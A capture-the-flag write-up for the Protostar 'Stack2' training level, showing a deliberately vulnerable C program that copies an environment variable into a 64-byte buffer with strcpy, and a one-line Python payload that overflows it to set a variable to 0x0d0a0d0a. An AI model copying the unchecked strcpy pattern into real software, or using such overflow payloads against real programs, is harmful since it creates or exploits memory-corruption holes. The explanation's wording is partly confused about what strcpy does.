# Stack2

## Description

Stack2 looks at environment variables, and how they can be set.

This level is at `/opt/protostar/bin/stack2`

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

## Approach

This program read the variable called `GREENIE` and It compare the variable to buffer with help of `strcpy()` function. As we know that limited buffer space will cause the overflow in binaries. Also if we modified the variable to `0x0d0a0d0a`. This will be solved.

For more checkout the Linux Programmer's Manual (BUGS):

```bash
man 3 strcpy
```

## Exploitation

Make the payload and Export as a variable `GREENIE` than execute!

```bash
export GREENIE=`python -c 'import struct; print "A"*64+struct.pack("I",0x0d0a0d0a)'` && ./stack2
```
